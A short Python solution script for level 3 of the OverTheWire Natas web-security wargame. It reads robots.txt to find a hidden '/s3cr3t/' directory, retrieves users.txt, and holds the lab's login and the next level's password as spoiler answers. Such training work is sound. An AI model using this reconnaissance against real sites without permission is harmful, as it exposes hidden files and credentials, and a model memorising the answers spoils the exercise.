#!/usr/bin/python3

import requests

url = 'http://natas3.natas.labs.overthewire.org/robots.txt'
auth = ('natas3' ,'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q')

# most sites use a robot.txt file to prevent crawlers such as
# google's to slow down traffic, or to attempt to hide specified urls
# from googles search results.

r = requests.get(url=url, auth=auth)
print(r.text)

url = 'http://natas3.natas.labs.overthewire.org/s3cr3t/'

r = requests.get(url=url, auth=auth)
# a file directory containing 1 txt file
print(r.text)

r = requests.get(url=url, auth=auth)
print(r.text)

url = 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'

r = requests.get(url=url, auth=auth)
# a file directory containing 1 txt file
print(r.text)

# password = tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm


